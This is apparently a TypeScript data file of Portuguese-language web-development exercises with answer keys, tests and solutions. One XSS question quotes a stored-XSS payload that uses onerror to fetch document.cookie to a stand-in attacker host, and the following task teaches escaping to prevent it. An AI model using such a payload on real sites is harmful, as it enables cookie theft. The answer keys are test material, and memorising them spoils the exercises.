import { Exercise } from '../../app/core/models/content.models';

const IMG =
  "data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='600' height='300'><rect width='100%' height='100%' fill='%23f5a524'/></svg>";

/** Tasks of the missions: usually "diagnose" (objective) followed by "fix" (code). */
export const MISSION_EXERCISES: readonly Exercise[] = [
  // ---------- Mission: responsive layout ----------
  {
    id: 'mission-layout-diagnosis',
    kind: 'multiple-choice',
    title: 'Por que os cartões vazam em telas pequenas?',
    difficulty: 'introductory',
    conceptIds: ['css-responsive-layout'],
    prompt: [
      {
        type: 'paragraph',
        text: 'Leia o CSS da página de preços (ele está no editor da próxima tarefa e reproduzido abaixo). Marque todas as causas reais do vazamento horizontal no celular.',
      },
      {
        type: 'code',
        language: 'css',
        code: `.cards { display: flex; gap: 16px; width: 960px; }
.card { width: 300px; flex-shrink: 0; }
.card img { width: 300px; }`,
      },
    ],
    options: [
      {
        id: 'container-width',
        text: '.cards tem largura fixa de 960px, maior que a tela.',
        explanation:
          'Correto. Um contêiner com largura fixa maior que a viewport sempre gera rolagem horizontal, não importa o que os filhos façam.',
      },
      {
        id: 'no-shrink',
        text: 'Os cartões têm largura fixa e flex-shrink: 0, então não podem encolher.',
        explanation:
          'Correto. flex-shrink: 0 proíbe o item de ficar menor que a largura definida; sem quebra de linha (flex-wrap), os três ficam lado a lado de qualquer jeito.',
      },
      {
        id: 'img-width',
        text: 'As imagens têm largura fixa de 300px.',
        explanation:
          'Correto. Mesmo que o cartão encolha, uma imagem com width fixo continua com 300px e vaza dele. max-width: 100% resolve.',
      },
      {
        id: 'flex-mobile',
        text: 'display: flex não funciona bem em navegadores de celular.',
        explanation:
          'Incorreto. Flexbox tem suporte completo nos navegadores atuais, inclusive móveis. O problema são as larguras fixas, não o flex.',
      },
      {
        id: 'viewport-meta',
        text: 'Falta a meta tag viewport.',
        explanation:
          'Incorreto neste caso: a prévia já declara a viewport. Mas é uma causa comum em sites reais: sem ela, o celular renderiza a página como se tivesse cerca de 980px de largura e a reduz.',
      },
    ],
    correctOptionIds: ['container-width', 'no-shrink', 'img-width'],
    hints: [
      'Há três causas corretas.',
      'Procure tudo que tem largura em pixels e não pode diminuir.',
    ],
    solution: [
      {
        type: 'paragraph',
        text: 'Três larguras rígidas se somam: o contêiner de 960px, os cartões que não encolhem e as imagens de 300px. Basta uma delas para vazar; para corrigir, as três precisam ceder.',
      },
    ],
  },
  {
    id: 'mission-layout-fix',
    kind: 'code',
    language: 'html',
    title: 'Corrija o layout sem media queries',
    difficulty: 'intermediate',
    conceptIds: ['css-responsive-layout'],
    prompt: [
      {
        type: 'paragraph',
        text: 'Corrija o CSS para que os três cartões fiquem lado a lado quando houver espaço e um embaixo do outro quando não houver, sem nada vazar. Altere só o <style>.',
      },
      {
        type: 'callout',
        tone: 'info',
        title: 'Por que sem @media?',
        text: 'Um layout intrínseco (flex-wrap ou grid com auto-fit e minmax) se adapta ao espaço do contêiner, não ao tamanho da tela: o mesmo componente funciona numa coluna estreita e numa área larga. Os testes medem o layout com o contêiner em 360px e em 1000px.',
      },
    ],
    requirements: [
      'Com 360px de largura, nenhum elemento ultrapassa a borda direita.',
      'Com 1000px de largura, os três cartões ficam na mesma linha.',
      'As imagens nunca ficam mais largas que o seu cartão.',
      'Sem @media (layout intrínseco).',
    ],
    examples: [],
    starterCode: `<style>
  .cards { display: flex; gap: 16px; width: 960px; }
  .card { width: 300px; flex-shrink: 0; border: 1px solid #ccc; border-radius: 8px; padding: 16px; box-sizing: border-box; }
  .card img { width: 300px; display: block; }
</style>

<div class="cards">
  <article class="card"><img src="${IMG}" alt=""><h2>Básico</h2><p>R$ 19/mês</p></article>
  <article class="card"><img src="${IMG}" alt=""><h2>Pro</h2><p>R$ 49/mês</p></article>
  <article class="card"><img src="${IMG}" alt=""><h2>Equipe</h2><p>R$ 99/mês</p></article>
</div>
`,
    tests: [
      {
        id: 'narrow',
        description: 'Com 360px, nenhum elemento vaza para a direita',
        source:
          "document.body.style.margin = '0'; document.body.style.width = '360px'; const vazando = [...document.querySelectorAll('body *')].filter((el) => el.getBoundingClientRect().right > 360.5).map((el) => el.tagName.toLowerCase() + (el.className ? '.' + el.className : '')); expect([...new Set(vazando)]).toEqual([]);",
      },
      {
        id: 'wide',
        description: 'Com 1000px, os três cartões ficam na mesma linha',
        source:
          "document.body.style.margin = '0'; document.body.style.width = '1000px'; const topos = [...document.querySelectorAll('.card')].map((c) => Math.round(c.getBoundingClientRect().top)); expect(topos.length).toBe(3); expect(new Set(topos).size === 1 ? [] : ['cartões em linhas diferentes: topos ' + topos.join(', ')]).toEqual([]);",
      },
      {
        id: 'images',
        description: 'As imagens não ficam mais largas que o cartão',
        source:
          "document.body.style.margin = '0'; document.body.style.width = '360px'; const largas = [...document.querySelectorAll('.card')].filter((card) => { const img = card.querySelector('img'); return img && img.getBoundingClientRect().width > card.getBoundingClientRect().width + 0.5; }).map((card) => card.querySelector('h2')?.textContent); expect(largas).toEqual([]);",
      },
      {
        id: 'no-media',
        description: 'Não usa @media (o layout é intrínseco)',
        source:
          "const temMedia = [...document.styleSheets].some((sheet) => [...sheet.cssRules].some((rule) => 'media' in rule && 'cssRules' in rule)); expect(temMedia ? ['há uma regra @media no CSS'] : []).toEqual([]);",
      },
    ],
    hints: [
      'Remova as larguras fixas do contêiner e permita que os cartões quebrem linha (flex-wrap: wrap).',
      'Com flex, flex: 1 1 250px diz: "comece com 250px, cresça e encolha conforme o espaço".',
      'Alternativa com grid: grid-template-columns: repeat(auto-fit, minmax(min(250px, 100%), 1fr)). E nas imagens, max-width: 100%.',
    ],
    solution: [
      {
        type: 'code',
        language: 'css',
        caption: 'Com flexbox',
        code: `.cards { display: flex; flex-wrap: wrap; gap: 16px; }
.card { flex: 1 1 250px; /* base 250px, cresce e encolhe */ }
.card img { max-width: 100%; height: auto; display: block; }`,
      },
      {
        type: 'code',
        language: 'css',
        caption: 'Com grid',
        code: `.cards {
  display: grid;
  gap: 16px;
  /* min(250px, 100%) evita vazar quando o contêiner é menor que 250px */
  grid-template-columns: repeat(auto-fit, minmax(min(250px, 100%), 1fr));
}
.card img { max-width: 100%; height: auto; display: block; }`,
      },
    ],
  },

  // ---------- Mission: typing bug ----------
  {
    id: 'mission-typing-predict',
    kind: 'predict-output',
    title: 'O total que não é número',
    difficulty: 'intermediate',
    conceptIds: ['ts-runtime-validation'],
    prompt: [
      {
        type: 'paragraph',
        text: 'Este código compila sem nenhum erro de TypeScript. O que ele imprime?',
      },
    ],
    language: 'typescript',
    code: `const resposta: any = JSON.parse('[{"preco": "10"}, {"preco": "5"}]');
const itens: { preco: number }[] = resposta;

let total = 0;
for (const item of itens) {
  total += item.preco;
}
console.log(total);`,
    acceptedAnswers: ['0105'],
    explanation:
      'Em tempo de execução, preco é a string "10": 0 + "10" vira a string "010" (concatenação), e "010" + "5" vira "0105". O TypeScript acreditou na anotação { preco: number }, porque o any desligou toda a verificação, mas os tipos não existem em runtime.',
    commonMistakes: [
      {
        answer: '15',
        explanation:
          'Seria 15 se preco fosse número. Os dados vieram do JSON como texto ("10"), e o TypeScript não converte nada: a anotação é só uma promessa, que aqui é falsa.',
      },
      {
        answer: 'NaN',
        explanation:
          'Com +, se um dos lados é string, o JavaScript concatena em vez de somar. NaN apareceria com outras operações, como 0 - "abc".',
      },
    ],
    wrongAnswerGuidance:
      'Não é isso. Lembre que os tipos somem na compilação: qual é o tipo real de preco depois do JSON.parse? E o que o operador + faz com número e texto?',
    hints: ['Olhe o JSON: "10" está entre aspas.', 'Em JavaScript, 0 + "10" é "010".'],
    solution: [
      {
        type: 'paragraph',
        text: 'Imprime 0105. O tipo any desligou a verificação e a anotação { preco: number } virou uma mentira. Dados externos (API, JSON, localStorage) precisam ser validados em runtime, e unknown obriga a fazer isso.',
      },
    ],
  },
  {
    id: 'mission-typing-fix',
    kind: 'code',
    language: 'typescript',
    title: 'Valide os dados da API',
    difficulty: 'intermediate',
    conceptIds: ['ts-runtime-validation'],
    prompt: [
      {
        type: 'paragraph',
        text: 'A API de pedidos às vezes manda preco como número (10) e às vezes como texto ("10.50"). Reescreva totalDoPedido para validar os dados em vez de confiar na anotação de tipo.',
      },
    ],
    requirements: [
      'Aceita preco como número ou como texto numérico ("10.50").',
      'Lança um erro se a entrada não for um array.',
      'Lança um erro se algum item não tiver um preco numérico válido.',
      'Retorna 0 para um pedido vazio.',
    ],
    examples: [
      { input: 'totalDoPedido([{ preco: 10 }, { preco: "5.5" }])', output: '15.5' },
      { input: 'totalDoPedido([])', output: '0' },
      { input: 'totalDoPedido([{ preco: "abc" }])', output: 'lança um erro' },
    ],
    starterCode: `interface Item {
  nome: string;
  preco: number;
}

// A API às vezes manda preco como texto ("10.50").
function totalDoPedido(itens: unknown): number {
  const lista = itens as Item[]; // ← o problema começa aqui
  let total = 0;
  for (const item of lista) {
    total += item.preco;
  }
  return total;
}

console.log(totalDoPedido([{ nome: 'Café', preco: '10' }, { nome: 'Pão', preco: 5 }]));
`,
    tests: [
      {
        id: 'numbers',
        description: 'Soma preços numéricos',
        source: 'expect(totalDoPedido([{ preco: 10 }, { preco: 5 }])).toBe(15);',
      },
      {
        id: 'strings',
        description: 'Converte preços em texto ("10.50")',
        source: "expect(totalDoPedido([{ preco: '10.50' }, { preco: '5' }])).toBeCloseTo(15.5);",
      },
      {
        id: 'empty',
        description: 'Retorna 0 para pedido vazio',
        source: 'expect(totalDoPedido([])).toBe(0);',
      },
      {
        id: 'invalid-price',
        description: 'Lança erro para preço não numérico',
        source:
          "expect(() => totalDoPedido([{ preco: 'abc' }])).toThrow(); expect(() => totalDoPedido([{ nome: 'sem preço' }])).toThrow();",
      },
      {
        id: 'not-array',
        description: 'Lança erro quando a entrada não é um array',
        source:
          'expect(() => totalDoPedido({ preco: 10 })).toThrow(); expect(() => totalDoPedido(null)).toThrow();',
      },
    ],
    hints: [
      'Comece com Array.isArray(itens): unknown obriga você a provar o formato antes de usar.',
      'Para cada item, confira se é objeto e leia preco. Number("10.50") converte texto; Number.isFinite rejeita NaN.',
      'Cuidado: Number("") é 0. Decida se texto vazio deve ser aceito (a solução comentada recusa).',
    ],
    solution: [
      {
        type: 'code',
        language: 'typescript',
        code: `function totalDoPedido(itens: unknown): number {
  if (!Array.isArray(itens)) {
    throw new TypeError('O pedido precisa ser uma lista de itens.');
  }
  let total = 0;
  for (const item of itens) {
    // Narrowing manual: só depois destas checagens usamos o valor.
    const bruto = typeof item === 'object' && item !== null ? (item as { preco?: unknown }).preco : undefined;
    const preco =
      typeof bruto === 'number' ? bruto : typeof bruto === 'string' && bruto.trim() !== '' ? Number(bruto) : NaN;
    if (!Number.isFinite(preco)) {
      throw new TypeError(\`Preço inválido: \${JSON.stringify(bruto)}\`);
    }
    total += preco;
  }
  return total;
}`,
      },
      {
        type: 'paragraph',
        text: 'A fronteira com o mundo externo recebe unknown, e o código prova o formato antes de usar. Em projetos maiores, bibliotecas de validação de esquema fazem isso de forma declarativa, mas o princípio é o mesmo: tipos estáticos não validam dados em runtime.',
      },
    ],
  },

  // ---------- Mission: XSS ----------
  {
    id: 'mission-xss-impact',
    kind: 'multiple-choice',
    title: 'O que esse comentário faz?',
    difficulty: 'intermediate',
    conceptIds: ['web-xss'],
    prompt: [
      {
        type: 'paragraph',
        text: 'Os comentários de um blog são exibidos com o código abaixo. Uma pessoa publica um comentário cujo texto é <img src=x onerror="fetch(\'https://atacante.example/?c=\' + document.cookie)">. O que acontece quando outra pessoa abre a página?',
      },
      {
        type: 'code',
        language: 'javascript',
        code: `function mostrarComentario(lista, comentario) {
  const item = document.createElement('li');
  item.innerHTML = \`<strong>\${comentario.autor}</strong>: \${comentario.texto}\`;
  lista.append(item);
}`,
      },
    ],
    options: [
      {
        id: 'xss',
        text: 'A imagem falha ao carregar, o onerror executa no contexto da página de quem está lendo, e o script pode enviar dados acessíveis por JavaScript para outro servidor.',
        explanation:
          'Correto. É um XSS armazenado: o código do atacante fica salvo no comentário e roda no navegador de cada visitante, com os mesmos poderes do JavaScript da página. Cookies com a flag HttpOnly não ficam visíveis para document.cookie, mas o script ainda pode agir em nome do usuário.',
      },
      {
        id: 'script-blocked',
        text: 'Nada: o navegador não executa scripts inseridos com innerHTML.',
        explanation:
          'Incorreto, e é uma confusão perigosa. Tags <script> inseridas com innerHTML realmente não executam, mas atributos de evento como onerror e onload executam. Por isso não existe innerHTML "seguro" com texto de usuário.',
      },
      {
        id: 'as-text',
        text: 'O comentário aparece como texto, com os sinais < e > visíveis.',
        explanation:
          'Incorreto. Isso aconteceria com textContent. innerHTML interpreta o texto como HTML e cria os elementos.',
      },
      {
        id: 'self-only',
        text: 'Só quem publicou o comentário é afetado.',
        explanation:
          'Incorreto. O comentário fica salvo e é exibido para todos os visitantes: cada um deles executa o script.',
      },
    ],
    correctOptionIds: ['xss'],
    hints: [
      'Diferencie <script> de atributos de evento (onerror, onload).',
      'Quem vê o comentário depois de publicado?',
    ],
    solution: [
      {
        type: 'paragraph',
        text: 'O onerror executa para cada visitante: XSS armazenado. A correção é não interpretar texto do usuário como HTML, como mostra a próxima tarefa.',
      },
    ],
  },
  {
    id: 'mission-xss-escape',
    kind: 'code',
    language: 'javascript',
    title: 'Escape o HTML antes de montar a string',
    difficulty: 'intermediate',
    conceptIds: ['web-xss'],
    prompt: [
      {
        type: 'paragraph',
        text: 'A correção preferida é não usar innerHTML com texto do usuário: crie os elementos e use textContent. Mas, quando um trecho de código precisa montar HTML como string (um template de e-mail, por exemplo), o texto do usuário tem de ser escapado. Implemente escaparHtml(texto).',
      },
      {
        type: 'callout',
        tone: 'security',
        title: 'Escapar não é filtrar',
        text: 'Remover "<script>" ou palavras perigosas (lista de bloqueio) sempre deixa brechas. Escapar transforma todos os caracteres especiais em entidades, e o navegador passa a mostrá-los como texto.',
      },
    ],
    requirements: [
      'Troca & por &amp;, < por &lt;, > por &gt;, " por &quot; e \' por &#39; (ou &#x27;).',
      'O & é tratado de forma que "<" vire exatamente "&lt;" (sem escapar duas vezes).',
      'Texto sem caracteres especiais volta igual.',
    ],
    examples: [
      { input: "escaparHtml('<b>Oi</b>')", output: "'&lt;b&gt;Oi&lt;/b&gt;'" },
      { input: "escaparHtml('Tom & Jerry')", output: "'Tom &amp; Jerry'" },
    ],
    starterCode: `function escaparHtml(texto) {
  // Seu código aqui
  return texto;
}

console.log(escaparHtml('<img src=x onerror="alert(1)">'));
`,
    tests: [
      {
        id: 'tags',
        description: 'Escapa < e >',
        source: "expect(escaparHtml('<b>Oi</b>')).toBe('&lt;b&gt;Oi&lt;/b&gt;');",
      },
      {
        id: 'amp',
        description: 'Escapa & sem escapar duas vezes',
        source:
          "expect(escaparHtml('Tom & Jerry')).toBe('Tom &amp; Jerry'); expect(escaparHtml('<')).toBe('&lt;');",
      },
      {
        id: 'quotes',
        description: 'Escapa aspas duplas e simples (para valores de atributos)',
        source:
          "expect(escaparHtml('\"')).toBe('&quot;'); const simples = escaparHtml(\"'\"); expect(['&#39;', '&#x27;'].includes(simples) ? [] : ['aspas simples viraram ' + simples]).toEqual([]);",
      },
      {
        id: 'attack',
        description: 'Neutraliza o comentário de ataque da tarefa anterior',
        source:
          "const r = escaparHtml('<img src=x onerror=\"alert(1)\">'); expect(r.includes('<') || r.includes('>') || r.includes('\"') ? ['ainda há caracteres especiais: ' + r] : []).toEqual([]);",
      },
      {
        id: 'plain',
        description: 'Mantém texto comum igual',
        source: "expect(escaparHtml('Olá, mundo')).toBe('Olá, mundo');",
      },
    ],
    hints: [
      'Use replace com expressão regular global, um caractere por vez, ou um único replace com um mapa.',
      'A ordem importa: se você troca < por &lt; e só depois troca & por &amp;, "<" vira "&amp;lt;". Escape o & primeiro, ou faça tudo num único replace.',
    ],
    solution: [
      {
        type: 'code',
        language: 'javascript',
        code: `const ENTIDADES = { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' };

function escaparHtml(texto) {
  // Um único replace: cada caractere é trocado uma vez só, então a ordem não importa.
  return String(texto).replace(/[&<>"']/g, (c) => ENTIDADES[c]);
}`,
      },
      {
        type: 'paragraph',
        text: 'No dia a dia, prefira não montar HTML com strings: use textContent (DOM puro) ou a interpolação {{ }} do Angular, que escapa automaticamente. No Angular, [innerHTML] passa por sanitização, e bypassSecurityTrustHtml desliga essa proteção: só deve ser usado com conteúdo que você controla.',
      },
    ],
  },
  // ---------- Mission: double charge (retry) ----------
  {
    id: 'mission-retry-diagnosis',
    kind: 'multiple-choice',
    title: 'O que a retentativa faz de errado?',
    difficulty: 'intermediate',
    conceptIds: ['web-http'],
    prompt: [
      {
        type: 'paragraph',
        text: 'Esta é a função usada por todas as chamadas da aplicação. Marque todos os problemas que explicam os sintomas.',
      },
      {
        type: 'code',
        language: 'javascript',
        code: `async function comRetentativa(requisicao, { metodo, tentativas = 3 }) {
  let resposta;
  for (let i = 0; i < tentativas; i++) {
    try {
      resposta = await requisicao();
      if (resposta.status < 500) return resposta;
    } catch (erro) {
      // tenta de novo
    }
  }
  return resposta;
}`,
      },
    ],
    options: [
      {
        id: 'repeats-post',
        text: 'Repete qualquer método, inclusive POST: se o primeiro pagamento foi processado e a resposta se perdeu, a repetição cobra de novo.',
        explanation:
          'Correto. O parâmetro metodo nem é usado. POST não é idempotente: só pode ser repetido com uma chave de idempotência aceita pela API.',
      },
      {
        id: 'gives-up-429',
        text: '429 é menor que 500, então é devolvido na hora, sem nova tentativa.',
        explanation:
          'Correto. "Pedidos demais" é uma falha passageira e típica de ser repetida depois de esperar; a regra status < 500 a trata como resposta final.',
      },
      {
        id: 'no-wait',
        text: 'Repete imediatamente, sem esperar, o que piora a sobrecarga do servidor.',
        explanation:
          'Correto. Três chamadas seguidas em milissegundos não dão tempo ao servidor de se recuperar, e multiplicam a carga no pior momento.',
      },
      {
        id: 'swallows-error',
        text: 'Se todas as tentativas falharem por erro de rede, devolve undefined em vez do erro.',
        explanation:
          'Correto. O catch vazio engole o erro; quem chama recebe undefined e falha mais adiante, longe da causa.',
      },
      {
        id: 'async-loop',
        text: 'await dentro de for não espera de verdade; as tentativas rodam em paralelo.',
        explanation:
          'Incorreto. await num for comum é sequencial. O problema de paralelismo acontece com forEach(async…), que não espera.',
      },
    ],
    correctOptionIds: ['repeats-post', 'gives-up-429', 'no-wait', 'swallows-error'],
    hints: ['Há quatro problemas.', 'Leia cada caminho: sucesso, 4xx, 5xx e erro de rede.'],
    solution: [
      {
        type: 'paragraph',
        text: 'A função ignora o método, classifica as falhas pela faixa errada, não espera entre as tentativas e engole o último erro.',
      },
    ],
  },
  {
    id: 'mission-retry-fix',
    kind: 'code',
    language: 'javascript',
    title: 'Retentativa com regras explícitas',
    difficulty: 'intermediate',
    conceptIds: ['web-http'],
    prompt: [
      {
        type: 'paragraph',
        text: 'Reescreva comRetentativa(requisicao, opcoes). requisicao() devolve uma promise de { status } ou rejeita (falha de rede). opcoes tem metodo, tentativas (padrão 3) e esperar(ms), que devolve uma promise.',
      },
    ],
    requirements: [
      'Só repete métodos idempotentes: GET, HEAD, PUT, DELETE e OPTIONS (sem diferenciar maiúsculas e minúsculas). POST e PATCH chamam requisicao uma única vez.',
      'Só repete falhas passageiras: status 429, 502, 503 ou 504, ou requisicao rejeitada.',
      'Faz no máximo tentativas chamadas no total.',
      'Antes de cada nova tentativa, aguarda esperar(100), depois esperar(200), esperar(400)…',
      'Quando não há mais tentativas: devolve a última resposta ou, se a última foi uma rejeição, lança aquele erro.',
      'Qualquer outro status (200, 404, 500…) é devolvido na hora.',
    ],
    examples: [
      {
        input: 'GET com respostas 503, 503, 200',
        output: '{ status: 200 }, depois de esperar(100) e esperar(200)',
      },
      { input: 'POST com resposta 503', output: '{ status: 503 }, com uma única chamada' },
    ],
    starterCode: `async function comRetentativa(requisicao, { metodo, tentativas = 3, esperar }) {
  let resposta;
  for (let i = 0; i < tentativas; i++) {
    try {
      resposta = await requisicao();
      if (resposta.status < 500) return resposta;
    } catch (erro) {
      // tenta de novo
    }
  }
  return resposta;
}
`,
    tests: [
      {
        id: 'success',
        description: 'Sucesso na primeira chamada não espera nem repete',
        source:
          "let n = 0; const esperas = []; const r = await comRetentativa(async () => { n++; return { status: 200 }; }, { metodo: 'GET', esperar: async (ms) => esperas.push(ms) }); expect(r.status).toBe(200); expect(n).toBe(1); expect(esperas).toEqual([]);",
      },
      {
        id: 'transient-get',
        description: 'GET com 503, 503, 200 devolve 200 depois de esperar 100 e 200 ms',
        source:
          "const fila = [503, 503, 200]; let n = 0; const esperas = []; const r = await comRetentativa(async () => ({ status: fila[n++] }), { metodo: 'GET', esperar: async (ms) => esperas.push(ms) }); expect(r.status).toBe(200); expect(n).toBe(3); expect(esperas).toEqual([100, 200]);",
      },
      {
        id: 'post-once',
        description: 'POST é chamado uma única vez, mesmo com 503',
        source:
          "let n = 0; const r = await comRetentativa(async () => { n++; return { status: 503 }; }, { metodo: 'POST', esperar: async () => {} }); expect(r.status).toBe(503); expect(n).toBe(1);",
      },
      {
        id: 'patch-network',
        description: 'PATCH com erro de rede lança o erro sem repetir',
        source:
          "let n = 0; let capturado; try { await comRetentativa(async () => { n++; throw new Error('rede'); }, { metodo: 'PATCH', esperar: async () => {} }); } catch (e) { capturado = e; } expect(capturado && capturado.message).toBe('rede'); expect(n).toBe(1);",
      },
      {
        id: 'not-transient',
        description: '404 e 500 são devolvidos sem repetir',
        source:
          "for (const status of [404, 500]) { let n = 0; const r = await comRetentativa(async () => { n++; return { status }; }, { metodo: 'GET', esperar: async () => {} }); expect(r.status).toBe(status); expect(n).toBe(1); }",
      },
      {
        id: 'network-exhausted',
        description: 'Erros de rede em todas as tentativas: lança o último erro',
        source:
          "let n = 0; const esperas = []; let capturado; try { await comRetentativa(async () => { n++; throw new Error('falha ' + n); }, { metodo: 'DELETE', esperar: async (ms) => esperas.push(ms) }); } catch (e) { capturado = e; } expect(capturado && capturado.message).toBe('falha 3'); expect(n).toBe(3); expect(esperas).toEqual([100, 200]);",
      },
      {
        id: 'limit-429',
        description:
          '429 é repetido; com tentativas: 5, espera 100, 200, 400 e 800 e devolve o último 429',
        source:
          "let n = 0; const esperas = []; const r = await comRetentativa(async () => { n++; return { status: 429 }; }, { metodo: 'get', tentativas: 5, esperar: async (ms) => esperas.push(ms) }); expect(r.status).toBe(429); expect(n).toBe(5); expect(esperas).toEqual([100, 200, 400, 800]);",
      },
    ],
    hints: [
      'Decida antes do laço quantas chamadas são permitidas: tentativas para idempotentes, 1 para o resto.',
      'A espera da tentativa i (começando em 1) é 100 * 2 ** (i - 1).',
      'No catch, se for a última tentativa, use throw erro.',
    ],
    solution: [
      {
        type: 'code',
        language: 'javascript',
        code: `const IDEMPOTENTES = ['GET', 'HEAD', 'PUT', 'DELETE', 'OPTIONS'];
const PASSAGEIROS = [429, 502, 503, 504];

async function comRetentativa(requisicao, { metodo, tentativas = 3, esperar }) {
  const limite = IDEMPOTENTES.includes(metodo.toUpperCase()) ? tentativas : 1;

  for (let i = 1; ; i++) {
    let resposta;
    try {
      resposta = await requisicao();
    } catch (erro) {
      if (i >= limite) throw erro; // não engole o último erro
      await esperar(100 * 2 ** (i - 1));
      continue;
    }
    if (!PASSAGEIROS.includes(resposta.status) || i >= limite) return resposta;
    await esperar(100 * 2 ** (i - 1)); // 100, 200, 400…
  }
}`,
      },
      {
        type: 'paragraph',
        text: 'O limite resolve o POST duplicado de uma vez: métodos não idempotentes têm uma única chance. A lista de status passageiros é explícita, em vez de uma faixa que mistura falhas passageiras com bugs. E o último erro sobe para quem chamou, que decide o que mostrar.',
      },
    ],
  },
  // ---------- Mission: checkout form ----------
  {
    id: 'mission-checkout-diagnosis',
    kind: 'multiple-choice',
    title: 'Uma causa para cada reclamação',
    difficulty: 'introductory',
    conceptIds: ['html-forms', 'html-form-labels'],
    prompt: [
      {
        type: 'paragraph',
        text: 'Este é o formulário atual. Marque todas as causas reais das reclamações.',
      },
      {
        type: 'code',
        language: 'html',
        code: `<form id="checkout" action="/pedidos" method="post">
  E-mail <input name="email" type="text">
  <label>CEP <input name="cep" type="number"></label>
  Cupom <input name="cupom"> <button id="aplicar">Aplicar cupom</button>
  <p>Entrega</p>
  <input type="radio" name="entrega" value="retirar"> Retirar na loja
  <input type="radio" name="entrega" value="casa"> Entregar em casa
  <button>Finalizar pedido</button>
</form>`,
      },
    ],
    options: [
      {
        id: 'cep-number',
        text: 'O CEP é type="number": com o hífen o valor fica vazio, e como número o zero à esquerda some.',
        explanation:
          'Correto. Medido no Chromium e no jsdom (está no Bestiário: "O CEP que chega vazio ou sem o zero").',
      },
      {
        id: 'coupon-submit',
        text: 'O botão "Aplicar cupom" não declara type, então é submit e envia o pedido.',
        explanation: 'Correto. Todo <button> dentro de <form> sem type é de envio.',
      },
      {
        id: 'no-labels',
        text: 'E-mail, cupom e os radios não têm rótulo associado, e as opções de entrega não têm título de grupo.',
        explanation:
          'Correto. Texto solto ao lado do campo não é rótulo: o leitor de tela anuncia só "campo de edição". O CEP está certo, porque o input está dentro do label.',
      },
      {
        id: 'no-autocomplete',
        text: 'Sem type="email" e sem autocomplete, o navegador não sabe que o campo é um e-mail e não oferece o preenchimento.',
        explanation:
          'Correto. type e autocomplete são os sinais que o navegador usa para preencher.',
      },
      {
        id: 'method-post',
        text: 'method="post" faz o navegador enviar o formulário ao clicar em qualquer botão.',
        explanation:
          'Incorreto. O método define como os dados são enviados, não quais botões enviam.',
      },
    ],
    correctOptionIds: ['cep-number', 'coupon-submit', 'no-labels', 'no-autocomplete'],
    hints: [
      'Há quatro causas corretas.',
      'Relacione cada reclamação do contexto a uma linha do HTML.',
    ],
    solution: [
      {
        type: 'paragraph',
        text: 'Tipo errado no CEP, botão sem type, rótulos e grupo ausentes, e nenhum sinal para o preenchimento automático.',
      },
    ],
  },
  {
    id: 'mission-checkout-fix',
    kind: 'code',
    language: 'html',
    title: 'Corrija o checkout só com HTML',
    difficulty: 'introductory',
    conceptIds: ['html-forms', 'html-form-labels'],
    prompt: [
      {
        type: 'paragraph',
        text: 'Corrija o formulário. Mantenha os atributos name e o id="aplicar" do botão do cupom: os testes encontram os elementos por eles.',
      },
    ],
    requirements: [
      'E-mail: type email, obrigatório, autocomplete="email".',
      'CEP: não pode ser type number; inputmode="numeric", autocomplete="postal-code" e um pattern que aceite 01310-100 e 01310100 e recuse 1310-100.',
      'O botão do cupom não envia o formulário; o de finalizar é type="submit".',
      'Os radios de entrega ficam num fieldset com legend.',
      'Todos os campos (inclusive cada radio) têm rótulo.',
    ],
    examples: [],
    starterCode: `<form id="checkout" action="/pedidos" method="post">
  E-mail <input name="email" type="text">
  <label>CEP <input name="cep" type="number"></label>
  Cupom <input name="cupom"> <button id="aplicar">Aplicar cupom</button>
  <p>Entrega</p>
  <input type="radio" name="entrega" value="retirar"> Retirar na loja
  <input type="radio" name="entrega" value="casa"> Entregar em casa
  <button>Finalizar pedido</button>
</form>
`,
    tests: [
      {
        id: 'coupon',
        description: 'O botão do cupom é type="button" e não envia o formulário',
        source:
          "const aplicar = document.querySelector('#aplicar'); expect(aplicar.type).toBe('button'); const form = document.querySelector('form'); let envios = 0; form.addEventListener('submit', (e) => { envios++; e.preventDefault(); }); aplicar.click(); expect(envios).toBe(0);",
      },
      {
        id: 'submit',
        description: 'Há exatamente um botão de envio',
        source:
          "const envio = Array.from(document.querySelectorAll('form button')).filter((b) => b.type === 'submit'); expect(envio.length).toBe(1); expect(envio[0].id === 'aplicar').toBe(false);",
      },
      {
        id: 'email',
        description: 'E-mail: type email, obrigatório, autocomplete email',
        source:
          "const e = document.querySelector('[name=email]'); expect(e.type).toBe('email'); expect(e.required).toBe(true); expect(e.getAttribute('autocomplete')).toBe('email');",
      },
      {
        id: 'cep',
        description: 'CEP como texto, teclado numérico, autocomplete e formato validado',
        source:
          "const c = document.querySelector('[name=cep]'); expect(c.type === 'number').toBe(false); expect(c.getAttribute('inputmode')).toBe('numeric'); expect(c.getAttribute('autocomplete')).toBe('postal-code'); expect(c.pattern.length > 0).toBe(true); for (const ok of ['01310-100', '01310100']) { c.value = ok; expect(c.value).toBe(ok); expect(c.validity.patternMismatch).toBe(false); } c.value = '1310-100'; expect(c.validity.patternMismatch).toBe(true);",
      },
      {
        id: 'fieldset',
        description: 'Radios de entrega num fieldset com legend',
        source:
          "const radios = Array.from(document.querySelectorAll('[name=entrega]')); expect(radios.length).toBe(2); expect(radios.every((r) => r.closest('fieldset'))).toBe(true); const legenda = radios[0].closest('fieldset').querySelector('legend'); expect(legenda && legenda.textContent.trim().length > 0).toBe(true);",
      },
      {
        id: 'labels',
        description: 'Todos os campos têm rótulo',
        source:
          "const semRotulo = Array.from(document.querySelectorAll('form input')).filter((i) => i.labels.length === 0).map((i) => i.name + (i.value ? '=' + i.value : '')); expect(semRotulo).toEqual([]);",
      },
    ],
    hints: [
      'Para cada reclamação há uma correção de uma linha.',
      'Rótulo: <label for="id"> com id no campo, ou o campo dentro do <label>.',
      'Um pattern para CEP: \\d{5}-?\\d{3} (o navegador exige que o valor inteiro corresponda).',
    ],
    solution: [
      {
        type: 'code',
        language: 'html',
        code: `<form id="checkout" action="/pedidos" method="post">
  <label for="email">E-mail</label>
  <input id="email" name="email" type="email" required autocomplete="email">

  <label for="cep">CEP</label>
  <input id="cep" name="cep" inputmode="numeric" autocomplete="postal-code"
         pattern="\\d{5}-?\\d{3}" required>

  <label for="cupom">Cupom</label>
  <input id="cupom" name="cupom">
  <button type="button" id="aplicar">Aplicar cupom</button>

  <fieldset>
    <legend>Entrega</legend>
    <label><input type="radio" name="entrega" value="retirar" required> Retirar na loja</label>
    <label><input type="radio" name="entrega" value="casa"> Entregar em casa</label>
  </fieldset>

